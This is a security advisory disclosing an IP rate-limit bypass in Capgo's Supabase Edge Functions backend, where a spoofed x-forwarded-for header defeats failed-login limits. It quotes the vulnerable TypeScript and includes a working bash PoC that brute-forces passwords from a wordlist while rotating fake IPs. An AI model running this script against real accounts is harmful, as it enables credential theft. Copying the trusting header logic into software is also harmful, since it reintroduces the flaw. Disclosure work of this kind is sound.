# VULN-002 — IP Rate-Limit Bypass via `x-forwarded-for` Header Spoofing

**Severity:** Medium  
**Component:** `supabase/functions/_backend/utils/rate_limit.ts` → `getClientIP`  
**Affected deployments:** Supabase Edge Functions path (when `cf-connecting-ip` is absent)

---

## Summary

The `getClientIP` utility, which supplies the IP address used for failed-authentication rate limiting, reads the **first** entry of the `x-forwarded-for` HTTP header when the Cloudflare-specific `cf-connecting-ip` header is absent. Because clients can freely prepend an arbitrary IP address as the first entry in `x-forwarded-for`, an attacker accessing the Supabase Edge Functions deployment can rotate spoofed IPs on every request, bypassing the 20-attempt IP rate limit indefinitely. When combined with VULN-001 (no CAPTCHA enforcement), there is effectively no rate-limiting protection on the credential oracle.

---

## Details

**Vulnerable code** (`supabase/functions/_backend/utils/rate_limit.ts`, lines 29–49):

```typescript
export function getClientIP(c: Context): string {
  // Cloudflare Workers provide the real client IP
  const cfConnectingIp = c.req.header('cf-connecting-ip')
  if (cfConnectingIp)
    return cfConnectingIp

  // Fallback to x-forwarded-for (less reliable but common)
  const forwardedFor = c.req.header('x-forwarded-for')
  if (forwardedFor) {
    // Take the first IP in the chain (original client)  ← VULNERABLE
    return forwardedFor.split(',')[0].trim()
  }
  ...
}
```

On the Cloudflare Workers path `cf-connecting-ip` is always set by Cloudflare and cannot be forged by a client. However, on the **Supabase Edge Functions** path (`https://<project>.supabase.co/functions/v1/`) this header is absent, so the code falls through to `x-forwarded-for`. A client can prepend any arbitrary value as the first comma-separated entry, which becomes the key used to track failed-authentication counts.

The rate-limit logic in `isIPRateLimited` / `recordFailedAuth` uses this value as the cache key:

```typescript
const ip = getClientIP(c)        // ← attacker controls this
...
const cacheKey = cacheHelper.buildRequest('/rate-limit/failed-auth', { ip })
```

A new fake IP every ≤19 requests yields unlimited attempts.

---

## PoC

**Prerequisites:**
- Access to the Supabase Edge Functions URL for the Capgo instance (not the Cloudflare Workers URL).
- A valid target email and `org_id`.

**Steps:**

```bash
# Rotate forged IPs every 19 requests to stay under the 20-attempt threshold.
# The server takes forwardedFor.split(',')[0] = "10.0.0.X" as the client IP.

COUNTER=0
for pw in $(cat wordlist.txt); do
  COUNTER=$((COUNTER + 1))
  FAKE_IP="10.0.0.$((COUNTER / 19))"   # new IP every 19 attempts

  curl -s -X POST https://<project>.supabase.co/functions/v1/private/validate_password_compliance \
    -H "Content-Type: application/json" \
    -H "x-forwarded-for: ${FAKE_IP}, 203.0.113.1" \
    -d "{\"email\":\"target@example.com\",\"password\":\"${pw}\",\"org_id\":\"<org-uuid>\"}" &

  # Throttle to avoid triggering other defences
  sleep 0.1
done
```

The response `{"error":"invalid_credentials"}` vs a non-401 response distinguishes wrong from correct passwords. The real server IP `203.0.113.1` appended after the comma is ignored because the code reads only `split(',')[0]`.

---

## Impact

**Type:** Rate-limit bypass  
**Authentication required:** None  
**CVSS estimate:** Medium (5.3 — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

On its own this vulnerability weakens the IP-based brute-force protection for all unauthenticated endpoints that call `getClientIP` / `isIPRateLimited` on the Supabase deployment path. In combination with VULN-001 (no CAPTCHA enforcement), the two vulnerabilities together create an unrestricted credential brute-force oracle, elevating the combined severity to **High**.

Affected endpoints that rely on `isIPRateLimited` / `recordFailedAuth` via `getClientIP`:
- `private/validate_password_compliance` (most critical — credential oracle)
- `utils/hono_middleware.ts` — `middlewareV2`, `middlewareKey` (API key authentication)
- `utils/channelSelfRateLimit.ts` — plugin channel-self operations
